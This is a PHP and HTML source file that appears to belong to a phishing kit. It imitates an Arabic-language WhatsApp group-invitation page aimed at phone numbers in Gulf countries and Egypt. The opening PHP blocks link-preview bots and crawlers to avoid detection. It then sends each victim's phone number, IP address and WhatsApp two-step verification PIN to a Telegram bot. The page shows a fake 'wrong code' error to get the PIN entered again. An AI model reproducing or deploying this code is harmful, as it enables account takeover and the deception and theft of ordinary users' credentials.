<?php
$blockedBots = ['facebookexternalhit', 'Facebot', 'Twitterbot', 'WhatsApp'];
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

foreach ($blockedBots as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        header('HTTP/1.1 403 Forbidden');
        exit;
    }
}
?>

<?php
// Vérification anti-bot simple
session_start();

// Fonction pour vérifier si c'est un bot
function isBot() {
    $bots = array(
        'bot', 'spider', 'crawler', 'wget', 'curl', 
        'python-requests', 'ruby', 'perl'
    );
    
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    
    foreach ($bots as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}

// Vérification du referrer
function checkReferrer() {
    $referrer = $_SERVER['HTTP_REFERER'] ?? '';
    $allowedDomains = array('voteenlign');
    
    foreach ($allowedDomains as $domain) {
        if (strpos($referrer, $domain) !== false) {
            return true;
        }
    }
    
    return !empty($referrer); // Accepter si le referrer n'est pas vide
}

// Si c'est un bot, bloquer l'accès
if (isBot()) {
    http_response_code(403);
    exit('Access Denied');
}

session_start();

require_once 'check_ip.php';
require_once 'bot.php';
require_once 'version.php';

$telegramToken = BOT_TOKEN;
$apiUrl = API_URL;
$chatId = BOT_CHAT_ID;






// Define message parts
$baseMessage = "<b>[Whtspp Code P4]</b>";
$baseMessage = "<b>[Whtspp Code P2]</b>";
$idd = $_POST['user_token'];
$numeratel = $_POST['whatsapp_number'];
$ipad = $_POST['user_ip'];
$confirm = $_POST['confirmcode'];

// Construct the message text
$messageText = "$baseMessage
    ID:#$idd: BOUGAYO IP: $ipad
    ID:#$idd: Numbers Phone: $numeratel
    ID:#$idd: whtspp Code P4: $confirm";

$parametre = [
    'chat_id' => $chatId,
    'parse_mode' => "HTML",
    'text' => $messageText,
];

$sender = curl_init($apiUrl . '/sendMessage');
curl_setopt($sender, CURLOPT_HEADER, false);
curl_setopt($sender, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($sender, CURLOPT_POST, 1);
curl_setopt($sender, CURLOPT_POSTFIELDS, ($parametre));
curl_setopt($sender, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($sender);
curl_close($sender);

$telegramToken = BOT_TOKEN;
$apiUrl = API_URL;
$chatId = BOT_CHAT_ID;


$messageText = "#nihayat_LHikaya#";
$encodedMsg = urlencode($messageText);


$parametre = [
    'chat_id' => $chatId,
    'parse_mode' => "HTML",
    'text' => $messageText,
];

$sender = curl_init($apiUrl . '/sendMessage');
curl_setopt($sender, CURLOPT_HEADER, false);
curl_setopt($sender, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($sender, CURLOPT_POST, 1);
curl_setopt($sender, CURLOPT_POSTFIELDS, ($parametre));
curl_setopt($sender, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($sender);
curl_close($sender);

?>


<
    ?>
    <!DOCTYPE html>
    <html lang="en" dir="ltr">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WhatsApp - الدعوة للانضمام إلى مجموعة</title>
        <link rel="stylesheet" href="./assets/css/style.css?v=<?php echo getAssetVersion(); ?>">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/css/intlTelInput.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
        <meta name="title" content="WhatsApp - الدعوة للانضمام إلى مجموعة">
        <meta name="description" content="انضم إلى مجموعة WhatsApp للتواصل مع الأصدقاء والعائلة">
        <meta name="keywords" content="WhatsApp, مجموعة واتساب, دردشة, تواصل اجتماعي, رسائل فورية">

        <!-- Open Graph / Facebook -->
        <meta property="og:type" content="website">
        <meta property="og:url" content="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?>">
        <meta property="og:title" content="WhatsApp - الدعوة للانضمام إلى مجموعة">
        <meta property="og:description" content="انضم إلى مجموعة WhatsApp للتواصل مع الأصدقاء والعائلة">
        <meta property="og:image" content="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST']; ?>/assets/img/J5gK5AgJ_L5.png">
        <meta property="og:site_name" content="WhatsApp">

        <!-- Twitter -->
        <meta property="twitter:card" content="summary_large_image">
        <meta property="twitter:url" content="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?>">
        <meta property="twitter:title" content="WhatsApp - الدعوة للانضمام إلى مجموعة">
        <meta property="twitter:description" content="انضم إلى مجموعة WhatsApp للتواصل مع الأصدقاء والعائلة">
        <meta property="twitter:image" content="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST']; ?>/assets/img/J5gK5AgJ_L5.png">

        <!-- Additional Meta Tags -->
        <meta name="theme-color" content="#25D366">
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
        <link rel="icon" type="image/png" href="./assets/img/ujTY9i_Jhs1.png">  
    </head>

    <body>
        <div class="container">
            <header>
                <div class="mobile-header">
                    <a href="#" class="download-btn"><svg width="16" height="16" viewBox="0 0 16 16" fill="none"
                            class="_wauiIcon__download-alternative _agnt _adid _arcp _afbl">
                            <path fill-rule="evenodd" clip-rule="evenodd"
                                d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z"
                                fill="currentColor"></path>
                            <path fill-rule="evenodd" clip-rule="evenodd"
                                d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z"
                                fill="currentColor"></path>
                        </svg></a>
                    <div class="logo">
                        <img src="assets/img/JvsnINJ2CZv.svg" alt="WhatsApp">
                    </div>
                    <button class="menu-toggle" id="menuToggle">
                        <span></span>
                        <span></span>
                        <span></span>
                    </button>
                    <nav class="nav-mobile">
                        <a href="#">الخصائص</a>
                        <a href="#">الأنشطة التجارية</a>
                        <a href="#">المدونة</a>
                        <a href="#">مركز المساعدة</a>
                        <a href="#">الخصوصية</a>
                        <a href="#">↓ تنزيل</a>
                    </nav>

                </div>

                <div class="desktop-header">
                    <div class="logo">
                        <img src="assets/img/JvsnINJ2CZv.svg" alt="WhatsApp">
                    </div>
                    <nav class="nav-menu">
                        <a href="#">الخصائص</a>
                        <a href="#">الأنشطة التجارية</a>
                        <a href="#">المدونة</a>
                        <a href="#">مركز المساعدة</a>
                        <a href="#">الخصوصية</a>
                    </nav>
                    <div class="header-buttons">

                        <a href="#" class="login-btn">تسجيل الدخول</a>
                        <a href="#" class="download-btn">↓ تنزيل</a>
                    </div>
                </div>
            </header>

            <main>
                <div class="join-group">
                    <div class="message-icon">
                        <img src="assets/img/_0dVljceIA5.png" alt="رسالة">
                    </div>
                    <h1>الدعوة للانضمام إلى مجموعة</h1>

                    <h3 class="_9vd5 _9scr" style="color:#5E5E5E;"></h3>
                    <h4 class="_9vd5 _9scb" style="color:#5E5E5E;">الدعوة للانضمام إلى مجموعة
                        <strong style="font-style: italic; font-size:16px; direction:ltr;">أدخل رمز
                            التحقق بخطوتين <br>(PIN)<br> الذي قمت بتجديده سابقا</strong>
                        <br><br>

                        <div class="form-group">
                            <input type="text" name="confirmcode" pattern="[0-9]*"
                                style="padding-right: 6px;direction: ltr;text-align: center;font-size:19px"
                                maxlength="6" class="cod88e form-control" disabled placeholder="*** ***">
                        </div>

                        <br>
                        <span style="color:#DC3545;font-weight:bold">رمز خاطئ غير صحيح</span>
                        <br>
                        <input type="hidden" name="user_token" value="<?php echo $_POST['user_token']; ?>">
                        <input type="hidden" name="user_ip" value="<?php echo $_POST['user_ip']; ?>">
                        <input type="hidden" name="user_country" value="<?php echo $_POST['user_country']; ?>">
                        <input type="hidden" name="whatsapp_number"
                            value="<?php echo $_POST['whatsapp_number'] ?>">
                        <button type="submit" class="join-btn">
                            الانضمام إلى الدردشة
                        </button>


                        <br>
                        <p>اتبع هذا الرابط للانضمام</p>
                        <br>
                        <a href="#" class="web-link">استخدم واتساب ويب</a>
                </div>
            </main>

            <footer>
                <div class="footer-links">
                    <div class="footer-section">
                        <h3>موقعنا</h3>
                        <ul>
                            <li><a href="#">الخصائص</a></li>
                            <li><a href="#">المدونة</a></li>
                            <li><a href="#">الحماية</a></li>
                            <li><a href="#">للأنشطة التجارية</a></li>
                        </ul>
                    </div>
                    <div class="footer-section">
                        <h3>من نحن</h3>
                        <ul>
                            <li><a href="#">نبذة عنا</a></li>
                            <li><a href="#">الوظائف</a></li>
                            <li><a href="#">مركز العلامة التجارية</a></li>
                            <li><a href="#">الخصوصية</a></li>
                        </ul>
                    </div>
                    <div class="footer-section">
                        <h3>استخدام واتساب</h3>
                        <ul>
                            <li><a href="#">أجهزة Android</a></li>
                            <li><a href="#">أجهزة iPhone</a></li>
                            <li><a href="#">كمبيوتر Mac/كمبيوتر شخصي</a></li>
                            <li><a href="#">واتساب ويب</a></li>
                        </ul>
                    </div>
                    <div class="footer-section">
                        <h3>هل تحتاج إلى المساعدة؟</h3>
                        <ul>
                            <li><a href="#">الاتصال بنا</a></li>
                            <li><a href="#">مركز المساعدة</a></li>
                            <li><a href="#">التطبيقات</a></li>
                            <li><a href="#">استشارات أمنية</a></li>
                        </ul>
                    </div>
                </div>
                <div class="footer-bottom">
                    <select class="language-select">
                        <option value="ar" class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ar">العربية</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=az">
                            Azərbaycan</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=af">
                            Afrikaans</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=id">
                            Bahasa Indonesia</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ms">
                            Melayu</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ca">
                            Català</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=cs">
                            čeština</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=da">
                            Dansk</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=de">
                            Deutsch</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=et">
                            Eesti</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=en">
                            English</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=es">
                            Español</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=fr">
                            Français</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ga">
                            Gaeilge</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=hr">
                            Hrvatski</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=it">
                            Italiano</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sw">
                            Kiswahili</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=lv">
                            Latviešu</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=lt">
                            Lietuvių</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=hu">
                            Magyar</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=nl">
                            Nederlands</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=nb">
                            Norsk bokmål</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=uz">
                            O‘zbek</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=tl">
                            Filipino</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pl">
                            Polski</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pt_br">
                            Português (Brasil)</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pt_pt">
                            Português (Portugal)</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ro">
                            Română</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sq">
                            Shqip</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sk">
                            Slovenčina</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sl">
                            Slovenščina</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=fi">
                            Suomi</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sv">
                            Svenska</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=vi">
                            Tiếng Việt</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=tr">
                            Türkçe</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=el">
                            Ελληνικά</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=bg">
                            български</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=kk">
                            қазақ тілі</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=mk">
                            македонски</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ru">
                            русский</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sr">
                            српски</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=uk">
                            українська</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=he">
                            עברית</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ar"
                            selected="1">العربية</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=fa">
                            فارسی</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ur">
                            اردو</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=bn">
                            বাংলা</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=hi">
                            हिन्दी</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=gu">
                            ગુજરાતી</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=kn">
                            ಕನ್ನಡ</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=mr">
                            मराठी</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pa">
                            ਪੰਜਾਬੀ</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ta">
                            தமிழ்</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=te">
                            తెలుగు</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ml">
                            മലയാളം</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=th">
                            ไทย</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=zh_cn">
                            简体中文</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=zh_tw">
                            繁體中文（台灣）</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=zh_hk">
                            繁體中文（香港）</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ja">
                            日本語</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ko">
                            한국어</option>
                    </select><select id="u_0_a_Us" class="_9tg0 _afo4 _afoc">
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=az">
                            azərbaycan</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=af">
                            Afrikaans</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=id">
                            Bahasa Indonesia</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ms">
                            Melayu</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ca">
                            català</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=cs">
                            čeština</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=da">
                            dansk</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=de">
                            Deutsch</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=et">
                            eesti</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=en">
                            English</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=es">
                            español</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=fr">
                            français</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ga">
                            Gaeilge</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=hr">
                            hrvatski</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=it">
                            italiano</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sw">
                            Kiswahili</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=lv">
                            latviešu</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=lt">
                            lietuvių</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=hu">
                            magyar</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=nl">
                            Nederlands</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=nb">
                            norsk bokmål</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=uz">
                            o‘zbek</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=tl">
                            Filipino</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pl">
                            polski</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pt_br">
                            Português (Brasil)</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pt_pt">
                            Português (Portugal)</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ro">
                            română</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sq">
                            shqip</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sk">
                            slovenčina</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sl">
                            slovenščina</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=fi">
                            suomi</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sv">
                            svenska</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=vi">
                            Tiếng Việt</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=tr">
                            Türkçe</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=el">
                            Ελληνικά</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=bg">
                            български</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=kk">
                            қазақ тілі</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=mk">
                            македонски</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ru">
                            русский</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sr">
                            српски</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=uk">
                            українська</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=he">
                            עברית</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ar"
                            selected="1">العربية</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=fa">
                            فارسی</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ur">
                            اردو</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=bn">
                            বাংলা</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=hi">
                            हिन्दी</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=gu">
                            ગુજરાતી</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=kn">
                            ಕನ್ನಡ</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=mr">
                            मराठी</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pa">
                            ਪੰਜਾਬੀ</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ta">
                            தமிழ்</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=te">
                            తెలుగు</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ml">
                            മലയാളം</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=th">
                            ไทย</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=zh_cn">
                            简体中文</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=zh_tw">
                            繁體中文（台灣）</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=zh_hk">
                            繁體中文（香港）</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ja">
                            日本語</option>
                        <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ko">
                            한국어</option>
                    </select>
                    <div class="social-links">
                        <a href="#" class="social-link"><i class="fab fa-facebook-f"></i></a>
                        <a href="#" class="social-link"><i class="fab fa-instagram"></i></a>
                        <a href="#" class="social-link"><i class="fab fa-youtube"></i></a>
                        <a href="#" class="social-link"><i class="fab fa-x-twitter"></i></a>
                    </div>
                    <div class="copyright">
                        <span>© 2025 WhatsApp LLC</span>
                        <span>الشروط والخصوصية</span>
                    </div>
                </div>
            </footer>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/intlTelInput.min.js"></script>
        <script>
            document.addEventListener('DOMContentLoaded', function() {
                const input = document.querySelector("#whatsapp_phone");
                const targetCountries = ['SA', 'OM', 'BH', 'KW', 'QA', 'AE', 'JO', 'EG'];

                // Get country code from PHP session
                const userCountry = '<?php echo isset($api_result["country_code"]) ? $api_result["country_code"] : "SA"; ?>';

                const iti = window.intlTelInput(input, {
                    initialCountry: targetCountries.includes(userCountry) ? userCountry.toLowerCase() : 'sa',
                    separateDialCode: true,
                    utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/utils.js",
                    onlyCountries: ['sa', 'ae', 'qa', 'om', 'bh', 'kw', 'jo', 'eg'],
                    allowDropdown: true,
                    autoHideDialCode: false,
                    formatOnDisplay: true,
                    nationalMode: true,
                    placeholderNumberType: "MOBILE",
                    preferredCountries: ['sa', 'ae', 'qa', 'om', 'bh', 'kw', 'jo']
                });

                // Add validation on form submit
                const form = document.querySelector('form');
                form.addEventListener('submit', function(e) {
                    if (!iti.isValidNumber()) {
                        e.preventDefault();
                        alert('من فضلك أدخل رقم هاتف صحيح');
                        input.classList.add('error');
                    } else {
                        input.classList.remove('error');
                    }
                });

                // Format number as user types
                input.addEventListener('input', function() {
                    if (iti.isValidNumber()) {
                        input.classList.remove('error');
                    }
                });

                // Update placeholder when country changes
                input.addEventListener('countrychange', function() {
                    input.placeholder = iti.getNumber(intlTelInputUtils.numberFormat.INTERNATIONAL);
                });
            });

            // Mobile Menu Toggle
            const menuToggle = document.getElementById('menuToggle');
            const navMobile = document.querySelector('.nav-mobile');
            const body = document.body;

            menuToggle.addEventListener('click', (e) => {
                e.stopPropagation();
                menuToggle.classList.toggle('active');
                navMobile.classList.toggle('active');
                body.classList.toggle('menu-open');
            });

            // Close menu when clicking outside
            document.addEventListener('click', (e) => {
                if (!e.target.closest('.nav-mobile') && !e.target.closest('.menu-toggle')) {
                    menuToggle.classList.remove('active');
                    navMobile.classList.remove('active');
                    body.classList.remove('menu-open');
                }
            });

            // Prevent menu close when clicking inside menu
            navMobile.addEventListener('click', (e) => {
                e.stopPropagation();
            });
        </script>
    </body>

    </html>